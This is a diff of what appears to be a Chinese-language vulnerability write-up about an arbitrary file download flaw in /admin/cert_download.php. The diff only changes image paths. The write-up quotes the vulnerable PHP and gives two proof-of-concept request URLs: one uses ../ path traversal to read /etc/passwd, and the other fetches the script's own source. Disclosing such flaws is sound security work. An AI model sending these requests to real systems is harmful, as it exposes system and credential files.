@@ -21,7 +21,7 @@
 出现漏洞的文件为 **/admin/cert_download.php**
 
 ```php
-![2](C:\Users\47236\Desktop\2.png)<?php
+![](C:\Users\47236\Desktop\2.png)<?php
 $filename = substr($file,strpos('certs/',$certfile)+6);
 //文件的类型
 header('Content-type: application/pdf');
@@ -38,10 +38,10 @@ exit();
 /admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd
 ```
 
-![](./images/202202162231024.png)
+![](images/202202162231024.png)
 
 ```plain
 /admin/cert_download.php?file=test.txt&certfile=cert_download.php
 ```
 
-![](./images/202202162234357.png)
+![](images/202202162234357.png)
